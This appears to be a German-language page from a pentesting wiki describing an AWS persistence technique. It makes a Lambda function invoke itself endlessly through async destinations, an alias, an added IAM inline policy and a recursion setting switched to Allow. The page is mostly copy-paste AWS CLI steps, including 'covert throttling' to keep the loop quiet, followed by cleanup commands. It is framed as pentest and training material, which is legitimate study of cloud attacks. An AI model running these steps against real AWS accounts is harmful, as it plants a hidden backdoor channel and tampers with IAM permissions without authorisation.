# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

{{#include ../../../../banners/hacktricks-training.md}}

Missbrauche Lambda asynchronous destinations zusammen mit der Recursion-Konfiguration, um eine Funktion kontinuierlich sich selbst neu aufzurufen, ganz ohne externen Scheduler (kein EventBridge, cron, etc.). Standardmäßig beendet Lambda rekursive Schleifen, aber das Setzen der recursion config auf Allow aktiviert sie wieder. Destinations liefern serverseitig bei asynchronen Invokes, sodass ein einzelner Seed-invoke einen unauffälligen, code-freien Heartbeat/Backdoor-Kanal erzeugt. Optional mit reserved concurrency drosseln, um das Noise-Level niedrig zu halten.

Hinweise
- Lambda erlaubt nicht, die Funktion direkt als eigenes destination zu konfigurieren. Verwende einen function alias als destination und erlaube der execution role, diesen Alias zu invoke.
- Mindestberechtigungen: Fähigkeit, die event invoke config und recursion config der Ziel-Funktion zu read/update, eine Version zu publishen und einen Alias zu manage, sowie die execution role policy der Funktion zu aktualisieren, um lambda:InvokeFunction auf dem Alias zu erlauben.

## Requirements
- Region: us-east-1
- Vars:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Steps

1) Funktion-ARN und aktuelle Recursion-Einstellung ermitteln
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Eine Version veröffentlichen und ein alias erstellen/aktualisieren (als self destination verwendet)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Erlaube der Ausführungsrolle der Funktion, das Alias aufzurufen (erforderlich für Lambda Destinations→Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) Konfiguriere die asynchrone Destination auf den Alias (selbst über Alias) und deaktiviere Wiederholungsversuche
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Rekursive Schleifen zulassen
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Einen einzelnen asynchronen Aufruf auslösen
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Beobachte kontinuierliche Aufrufe (Beispiele)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Optionale verdeckte Drosselung
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Bereinigung
Schleife unterbrechen und Persistenz entfernen.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Auswirkungen
- Ein einzelner async invoke verursacht, dass Lambda sich kontinuierlich ohne externen Scheduler erneut aufruft und so heimliche persistence/heartbeat ermöglicht. Reserved concurrency kann den Lärm auf eine einzige warme Ausführung begrenzen.
{{#include ../../../../banners/hacktricks-training.md}}
